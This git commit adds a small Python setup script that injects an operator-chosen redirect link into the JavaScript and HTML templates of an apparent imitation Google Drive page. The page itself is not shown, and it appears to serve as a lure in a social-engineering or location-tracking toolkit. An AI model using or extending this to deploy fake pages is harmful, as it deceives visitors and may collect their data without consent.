8be8d23e3af175b9c03ffb2eb03153cc1666f0bc
CacucoH <69527419+CacucoH@users.noreply.github.com>
2021-03-09 17:50:26 +0300

    Add files via upload

---
+++ template/mod_gdrive_rus.py
@@ -0,0 +1,18 @@
+#!/usr/bin/env python3
+
+R = '\033[31m' # red
+G = '\033[32m' # green
+C = '\033[36m' # cyan
+W = '\033[0m'  # white
+
+link = str(input(G + '[+]' + C + " Do you want to use custom link to real GDrive?(y/n): "))
+if link in ['y', 'Y', 'yes', 'Yes', 'yeah', 'Yeah']:
+	link = str(input(G + '[+]' + C + " Enter your link: " + W))
+with open('template/gdrive_rus/js/location_temp.js', 'r') as js:
+	reader = js.read()
+	update = reader.replace('REDIRECT_URL', link)
+with open('template/gdrive_rus/js/location.js', 'w') as js_update:
+	js_update.write(update)
+with open('template/gdrive_rus/index.html', 'r') as index_228:
+	repl = index_228.read()
+	repl = repl.replace('$LINK$', link)
